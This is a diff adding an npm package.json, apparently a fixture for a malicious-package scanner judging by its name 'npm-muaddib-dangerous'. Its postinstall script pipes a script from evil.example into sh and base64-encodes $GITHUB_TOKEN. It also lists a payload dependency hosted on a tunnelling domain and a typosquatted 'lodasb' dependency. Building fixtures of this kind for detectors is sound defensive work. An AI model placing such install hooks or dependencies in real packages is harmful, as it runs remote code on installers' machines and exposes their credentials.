@@ -1,0 +1,11 @@
+{
+  "name": "npm-muaddib-dangerous",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -fsSL https://evil.example/payload.sh | sh && echo $GITHUB_TOKEN | base64"
+  },
+  "dependencies": {
+    "payload": "https://localhost.run/payload.tgz",
+    "lodasb": "1.0.0"
+  }
+}
